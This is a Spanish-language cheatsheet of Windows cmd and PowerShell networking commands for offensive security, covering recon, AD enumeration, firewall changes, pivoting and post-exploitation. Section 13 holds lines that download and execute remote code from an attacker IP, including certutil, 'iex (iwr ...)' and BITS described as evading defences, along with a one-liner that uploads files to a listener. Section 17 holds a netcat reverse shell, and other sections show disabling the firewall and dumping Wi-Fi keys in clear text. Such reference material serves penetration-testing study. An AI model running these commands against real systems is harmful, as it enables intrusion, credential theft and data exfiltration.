# Nombre: cheatsheet-red-windows
# Descripción: Cheatsheet de red para Windows (cmd + PowerShell) orientada a ciberseguridad: recon, enumeración, firewall, pivoting y post-explotación.
# Tags: windows, network, cmd, powershell, netstat, netsh, smb, firewall
# Uso: referencia rapida; busca con Ctrl+F la seccion que necesites (clasica y PowerShell)

# Cheatsheet de Red — Windows (cmd + PowerShell)

> Clasica = `cmd` · PS = `PowerShell`. En muchos comandos clasicos puedes usar la version moderna de PS con `Get-Net*`.

## 1. Configuración de red / Interfaces
- `ipconfig /all` → IP, máscara, gateway, DNS, MAC, DHCP
- `ipconfig /release` · `ipconfig /renew` · `ipconfig /flushdns` → DHCP / limpiar caché DNS
- `ipconfig /displaydns` → caché DNS local (filtrar dominios visitados)
- PS: `Get-NetIPConfiguration` · `Get-NetIPAddress` · `Get-NetAdapter`
- PS: `Get-NetAdapter | Select Name,MacAddress,Status,LinkSpeed`
- `getmac` / `getmac /v /fo list` → MAC de todas las NIC (Único ID válido: buscar duplicados = VM)
- PS: `Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object IPEnabled` → en detalle
- Cambiar IP rápida (elegir IP libre): `netsh interface ip set address "Ethernet" static 10.10.10.66 255.255.255.0 10.10.10.1`
- Buscar IP libre: `for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i >nul 2>&1 && echo 10.10.10.%i alive`

## 2. DNS
- `nslookup dominio.com` · `nslookup dominio.com 8.8.8.8` (con DNS concreto)
- `nslookup -type=ANY dominio.com` · `-type=MX` · `-type=TXT` · `-type=NS`
- PS: `Resolve-DnsName dominio.com` · `Resolve-DnsName -Type TXT` · `-Server 8.8.8.8`
- PS: `Resolve-DnsName dominio.com -Type A -Server <DNS-AD>` → resolución interna (recon de AD)
- Fuerza bruta DNS: `for %i in (admin dc files vpn) do @nslookup %i.dominio.com | find "Address:"`
- Comprobar servers DNS configurados: `ipconfig /all | findstr /i "DNS"`

## 3. Tabla ARP (hosts de la LAN)
- `arp -a` → hosts conocidos en la subred (IP ↔ MAC)
- `arp -d *` → borrar caché ARP
- PS: `Get-NetNeighbor` → equivalente moderno

## 4. Rutas / Routing
- `route print` / `route print 0.0.*` → tabla de rutas
- `route add -p 10.10.11.0 mask 255.255.255.0 10.10.11.254` → ruta estática persistente (acceder a red interna vía pivot)
- `route delete <destino>` · `route change`
- PS: `Get-NetRoute` · `New-NetRoute -DestinationPrefix 10.10.11.0/24 -NextHop 10.10.11.254`
- Ver con qué ruta sale un destino: `tracert 10.10.11.5`

## 5. Conexiones y puertos (netstat) ★
- `netstat -ano` → todas las conexiones (a=all, n=numeros, o=PID)
- `netstat -ano | findstr LISTENING` → puertos abiertos
- `netstat -anob` → con el ejecutable (requiere admin)
- `netstat -ano | findstr :445` → filtrar por puerto
- `netstat -r` → tabla de rutas
- Por PID: `tasklist | findstr <PID>` → qué proceso usa el puerto
- PS: `Get-NetTCPConnection -State Listen` → PS: `Get-NetTCPConnection -LocalPort 445`
- PS: `Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess`
- Descubrir puerto que usa un proceso: `netstat -ano | findstr " <PID>"`

## 6. Descubrimiento de hosts y puertos (sin nmap)
- Ping sweep: `for /L %i in (1,1,254) do @ping -n 1 -w 200 10.10.10.%i | find "TTL="`
- PS ping sweep: `1..254 | % { $ip="10.10.10.$_"; if (Test-Connection $ip -Count 1 -Quiet) { $ip } }`
- `Test-NetConnection 10.10.10.5` → diagnostico completo (ping, traceroute, puerto)
- `Test-NetConnection 10.10.10.5 -Port 445` → comprobar un puerto TCP
- PS: `1..1000 | % { $p=$_; $c=New-Object Net.Sockets.TcpClient; if($c.ConnectAsync("10.10.10.5",$p).Wait(100)){"open: $p";$c.Close()} }`
- `telnet 10.10.10.5 445` → banner de un puerto (el clasico)

## 7. SMB / CIFS ★ (enumeración Windows en la propia maquina)
- `net view \\IP` → recursos compartidos de un equipo remoto
- `net view \\IP /all` → incluye compartidos ocultos ($)
- `net use \\IP\C$` → montar C$ (requiere credenciales)
- `net use * /delete /y` → limpiar sesiones SMB abiertas
- `net share` → compartidos locales
- PS: `Get-SmbShare` · `Get-SmbShare -Special` · `Get-SmbConnection`
- PS: `Get-SmbOpenFile` → archivos abiertos en el SMB local
- Conexiones establecidas: `net use` (ver hacia dónde tengo sesiones)

## 8. NetBIOS (legado, red interna)
- `nbtstat -n` → nombre NetBIOS local
- `nbtstat -A 10.10.10.5` → tabla NetBIOS remota (marca `<20>` = comparte archivos)
- `nbtstat -a nombre` · `nbtstat -c` → caché NetBIOS

## 9. Usuarios, sesiones y dominio ★ (recon de AD)
- `net user` · `net user /domain` · `net user <usuario>` · `net user <usuario> /domain`
- `net localgroup Administrators` · `net localgroup Administrators /domain`
- `net group "Domain Admins" /domain` · `net group /domain`
- `whoami` · `whoami /all` → identidad y privilegios/tokens
- `net accounts /domain` → políticas de contraseña (para fuerza bruta)
- `net session` → sesiones activas entrantes (hay que ser admin)
- `netstat -ano | findstr ":135\|:445\|:3389"` → con quién hay tráfico de red/AD
- `net time /domain` → DC; `echo %logonserver%` → DC al que estoy autenticado
- PS: `Get-CimInstance Win32_ComputerSystem | Select Domain,PartOfDomain`
- PS: `Get-ADComputer -Filter * -Properties OperatingSystem` (con RSAT, en DC)
- PS: `Get-ADUser -Filter * -Properties LastLogon,PasswordLastSet`

## 10. Firewall de Windows (netsh) ★
- `netsh advfirewall firewall show rule name=all` → todas las reglas (mucho output)
- `netsh advfirewall firewall show rule name=all | findstr /i "Enabled Action Dir Profile Port Protocol LocalPort RemotePort"` → resumen
- `netsh advfirewall show currentprofile` → estado (ON/OFF)
- `netsh advfirewall set allprofiles state off` → DESACTIVAR firewall (requiere admin)
- `netsh advfirewall firewall add rule name="r" dir=in action=allow protocol=TCP localport=4444` → abrir puerto (para listener)
- `netsh advfirewall firewall delete rule name="r"`
- PS: `Get-NetFirewallRule | Where-Object Enabled` · `New-NetFirewallRule -DisplayName "r" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow`
- Reglas de bloqueo saliente de Windows Defender (WIN/10/11): `netsh advfirewall firewall show rule name="Windows Defender"`

## 11. Port forwarding / Pivoting (netsh) ★
- `netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.11.5` → redirigir puerto (pivot hacia red interna)
- `netsh interface portproxy show all` → ver reglas
- `netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444`
- Nota: en Windows moderno se usa `netsh interface portproxy` (alternativa a socat)
- PS: `netsh routing ip add ...` (para RRAS, casi nunca)

## 12. WiFi
- `netsh wlan show profiles` → redes guardadas
- `netsh wlan show profile name="NombreRed" key=clear` → ver la contraseña en claro (post-explotación)
- `netsh wlan show interfaces` → red conectada, señal, SSID, BSSID
- `netsh wlan show drivers` · `netsh wlan export profile folder=C:\temp key=clear` → exportar perfiles
- PS: `netsh wlan show hostednetwork` · `netsh wlan start hostednetwork`

## 13. HTTP / Descarga y transferencia de archivos
- `certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe` → descargar (clasico, no detectado)
- `certutil -urlcache -f -split http://IP/archivo.exe salida.exe`
- `certutil -encode file.bin file.b64` · `certutil -decode file.b64 file.bin` → base64 local
- PS: `iwr -Uri http://10.10.14.5/nc.exe -OutFile nc.exe` (Invoke-WebRequest)
- PS: `Invoke-WebRequest http://10.10.14.5/file.ps1 -OutFile file.ps1` · `iex (iwr http://IP/shell.ps1)` (IEX desde memoria)
- PS: `(New-Object Net.WebClient).DownloadFile("http://IP/nc.exe","C:\Temp\nc.exe")`
- PS: `Start-BitsTransfer -Source http://IP/file -Destination C:\Temp\file` (BITS, evita algunas defensas)
- `bitsadmin /transfer dl /download /priority normal http://IP/file C:\Temp\file` (clasico)
- PS subir archivo a nuestro listener: `$f="file.txt"; $b=[IO.File]::ReadAllBytes($f); (New-Object Net.WebClient).UploadString("http://IP/recv", [Convert]::ToBase64String($b))`

## 14. Captura de tráfico
- `netsh trace start capture=yes filepath=C:\temp\trace.etl` · `netsh trace stop` → captura nativa (EVM, se abre con Wireshark/netmon)
- `pktmon start --capture` · `pktmon stop` → capturador moderno (Win10 2004+), .etl → etl2pcapng
- Wireshark/tshark si están instalados (portable para auditorías)
- PS: `Get-NetUDPEndpoint` → sockets UDP locales abiertos

## 15. RDP
- `mstsc /v:10.10.10.5` → conectarse por RDP
- `mstsc /v:10.10.10.5 /admin` → sesión de consola (evita que se deslogue el usuario)
- `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections` → ¿RDP habilitado? (0=si)
- `net localgroup "Remote Desktop Users"` → quién puede conectarse
- `qwinsta` / `query user` → sesiones RDP activas (puedo robar la sesión de otro usuario)

## 16. Proxy del sistema
- `netsh winhttp show proxy` → proxy WinHTTP (lo usan apps del sistema)
- `netsh winhttp set proxy proxy=10.10.14.5:8080` → establecer
- `netsh winhttp reset proxy`
- PS: `Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select ProxyEnable,ProxyServer,ProxyOverride`
- `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1` (activar proxy en IE/Edge)

## 17. Sockets / listener / reverse shell
- `nc.exe -lvnp 4444` → listener (netcat; traer copia portable)
- `nc.exe 10.10.14.5 4444 -e cmd.exe` → bind/reverse shell con -e (nc clásico)
- PS listener basico: `$l=[Net.Sockets.TcpListener]::new(4444); $l.Start(); $c=$l.AcceptTcpClient(); $s=$c.GetStream(); ...`
- Conexión saliente PowerShell (reverse shell): ver `04-post-exploitation/windows`
- Comprobar si el puerto del listener está escuchando en la maquina victima: `netstat -ano | findstr :4444`

## 18. Servicios de red locales (para post-explotación)
- `sc query state= all | findstr SERVICE_NAME` → servicios
- `net start` → servicios en ejecución (comparar con servicios de red)
- PS: `Get-Service | Where-Object Status -eq Running`
- `net stop <servicio>` · `net start <servicio>`
- Ver puertos de SQL/Web locales y su proceso: `netstat -anob | findstr ":80 :443 :1433 :3389"`

## 19. Misc / trucos rápidos
- `ping -a 10.10.10.5` → resolución inversa de hostname
- `tracert 10.10.10.5` · `tracert -d` (sin resolver, más rápido) · `pathping 10.10.10.5` (más lento pero detalla perdida)
- `whoami /upn` · `whoami /fqdn` → UPN/FQDN del usuario
- `systeminfo | findstr /i "host name os version system type"` → SO y arquitectura (afecta a payloads)
- `wmic computersystem get domain,name,manufacturer,model` (legado) → PS: `Get-CimInstance Win32_ComputerSystem | Select Domain,Manufacturer,Model`
- `nltest /dsgetdc:dominio.com` → info del DC (falla en no-dominio)
- `netdom query fsmo` · `nltest /domain_trusts` (si son admin de dominio)
- `arp -a | findstr dynamic` → solo hosts con tráfico reciente
- `ipconfig /all | findstr /i "Default Gateway"` → gateway
- `wmic nic get macaddress` → MACs

## 20. PowerShell: utilidades de red (los más usados en auditorías)
- `Test-NetConnection 10.10.10.5 -InformationLevel Detailed` → ping+tracert+puerto
- `Resolve-DnsName -Name dc01.dominio.com -Type A -Server 10.10.10.5`
- `Get-NetTCPConnection -RemotePort 445 | Select RemoteAddress,RemotePort,State` → con quién hablo SMB
- `Get-NetTCPConnection -RemoteAddress 10.10.10.5` → tráfico con un host
- `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet*` → config de red de usuario

## Notas de defensa
- `netstat -anob` + `Get-NetTCPConnection` = primera herramienta de triage ante sospecha de C2 o exfiltración.
- Revisa `netsh wlan show profiles ... key=clear`, `ipconfig /displaydns` y el historial del navegador al analizar un host comprometido.
- `pktmon` y `netsh trace` permiten capturar sin herramientas externas en un host restringido.
